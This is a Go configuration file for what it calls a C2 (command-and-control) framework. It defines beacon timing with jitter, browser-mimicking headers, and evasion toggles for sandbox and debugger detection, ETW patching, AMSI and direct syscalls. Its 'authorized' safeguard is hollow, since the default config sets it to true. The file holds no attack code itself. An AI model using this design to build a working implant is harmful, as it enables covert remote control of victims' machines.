package core

import (
	"crypto/rand"
	"encoding/json"
	"fmt"
	"os"
	"time"
)

// Config holds the framework configuration
type Config struct {
	// Authorization flag - MUST be set to true for legitimate use
	Authorized bool `json:"authorized"`
	
	// C2 server configuration
	Server ServerConfig `json:"server"`
	
	// Encryption settings
	Encryption EncryptionConfig `json:"encryption"`
	
	// Communication settings
	Communication CommConfig `json:"communication"`
	
	// Evasion settings
	Evasion EvasionConfig `json:"evasion"`
	
	// Logging settings
	Logging LoggingConfig `json:"logging"`
	
	// Session management
	Session SessionConfig `json:"session"`
}

// ServerConfig holds C2 server settings
type ServerConfig struct {
	Host            string        `json:"host"`
	Port            int           `json:"port"`
	TLSEnabled      bool          `json:"tls_enabled"`
	TLSCertPath     string        `json:"tls_cert_path"`
	TLSKeyPath      string        `json:"tls_key_path"`
	ReadTimeout     time.Duration `json:"read_timeout"`
	WriteTimeout    time.Duration `json:"write_timeout"`
	MaxConnections  int           `json:"max_connections"`
	KeepAlive       time.Duration `json:"keep_alive"`
}

// EncryptionConfig holds encryption parameters
type EncryptionConfig struct {
	Algorithm    string `json:"algorithm"` // aes256, chacha20, xchacha20
	KeySize      int    `json:"key_size"`
	IVSize       int    `json:"iv_size"`
	KeyExchange  string `json:"key_exchange"` // ecdh, rsa, dh
	Compression  bool   `json:"compression"`
	CompressLevel int   `json:"compress_level"`
}

// CommConfig holds communication protocol settings
type CommConfig struct {
	Protocol      string        `json:"protocol"` // http, https, dns, icmp
	Jitter        float64       `json:"jitter"`   // 0.0-1.0
	Sleep         time.Duration `json:"sleep"`
	Retries       int           `json:"retries"`
	RetryDelay    time.Duration `json:"retry_delay"`
	UserAgent     string        `json:"user_agent"`
	Headers       map[string]string `json:"headers"`
	ProxyURL      string        `json:"proxy_url"`
}

// EvasionConfig holds evasion technique settings
type EvasionConfig struct {
	EnableSandboxDetection bool `json:"enable_sandbox_detection"`
	EnableDebuggerCheck    bool `json:"enable_debugger_check"`
	EnableVMDetection      bool `json:"enable_vm_detection"`
	EnableETWPatches       bool `json:"enable_etw_patches"`
	EnableAMSI             bool `json:"enable_amsi"`
	SleepMask              bool `json:"sleep_mask"`
	DirectSyscalls         bool `json:"direct_syscalls"`
}

// LoggingConfig holds logging settings
type LoggingConfig struct {
	Level      string `json:"level"` // debug, info, warn, error
	File       string `json:"file"`
	Console    bool   `json:"console"`
	MaxSize    int64  `json:"max_size"`
	MaxBackups int    `json:"max_backups"`
}

// SessionConfig holds session management settings
type SessionConfig struct {
	SessionID       string        `json:"session_id"`
	Key             []byte        `json:"key"`
	Heartbeat       time.Duration `json:"heartbeat"`
	Timeout         time.Duration `json:"timeout"`
	MaxCommands     int           `json:"max_commands"`
	CommandTimeout  time.Duration `json:"command_timeout"`
}

// DefaultConfig returns a default configuration
func DefaultConfig() *Config {
	// Generate random session key
	sessionKey := make([]byte, 32)
	if _, err := rand.Read(sessionKey); err != nil {
		panic("Failed to generate session key")
	}
	
	// Generate session ID
	sessionID := generateSessionID()
	
	return &Config{
		Authorized: true, // Must be explicitly set for legitimate use
		Server: ServerConfig{
			Host:           "0.0.0.0",
			Port:           8443,
			TLSEnabled:     true,
			ReadTimeout:    30 * time.Second,
			WriteTimeout:   30 * time.Second,
			MaxConnections: 100,
			KeepAlive:      60 * time.Second,
		},
		Encryption: EncryptionConfig{
			Algorithm:     "aes256",
			KeySize:       32,
			IVSize:        16,
			KeyExchange:   "ecdh",
			Compression:   true,
			CompressLevel: 6,
		},
		Communication: CommConfig{
			Protocol:   "https",
			Jitter:     0.3,
			Sleep:      10 * time.Second,
			Retries:    3,
			RetryDelay: 5 * time.Second,
			UserAgent:  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
			Headers: map[string]string{
				"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
				"Accept-Language": "en-US,en;q=0.5",
				"Accept-Encoding": "gzip, deflate",
				"Connection":      "keep-alive",
			},
		},
		Evasion: EvasionConfig{
			EnableSandboxDetection: true,
			EnableDebuggerCheck:    true,
			EnableVMDetection:      false,
			EnableETWPatches:       false,
			EnableAMSI:             false,
			SleepMask:              true,
			DirectSyscalls:         false,
		},
		Logging: LoggingConfig{
			Level:      "info",
			Console:    true,
			MaxSize:    10 * 1024 * 1024, // 10MB
			MaxBackups: 5,
		},
		Session: SessionConfig{
			SessionID:      sessionID,
			Key:            sessionKey,
			Heartbeat:      30 * time.Second,
			Timeout:        300 * time.Second,
			MaxCommands:    100,
			CommandTimeout: 60 * time.Second,
		},
	}
}

// LoadConfig loads configuration from file
func LoadConfig(path string) (*Config, error) {
	if path == "" {
		return DefaultConfig(), nil
	}
	
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read config: %w", err)
	}
	
	var cfg Config
	if err := json.Unmarshal(data, &cfg); err != nil {
		return nil, fmt.Errorf("failed to parse config: %w", err)
	}
	
	// Validate critical settings
	if !cfg.Authorized {
		return nil, fmt.Errorf("configuration not authorized for use")
	}
	
	return &cfg, nil
}

// SaveConfig saves configuration to file
func SaveConfig(cfg *Config, path string) error {
	data, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal config: %w", err)
	}
	
	if err := os.WriteFile(path, data, 0600); err != nil {
		return fmt.Errorf("failed to write config: %w", err)
	}
	
	return nil
}

func generateSessionID() string {
	b := make([]byte, 16)
	if _, err := rand.Read(b); err != nil {
		return "default-session"
	}
	return fmt.Sprintf("%x", b)
}

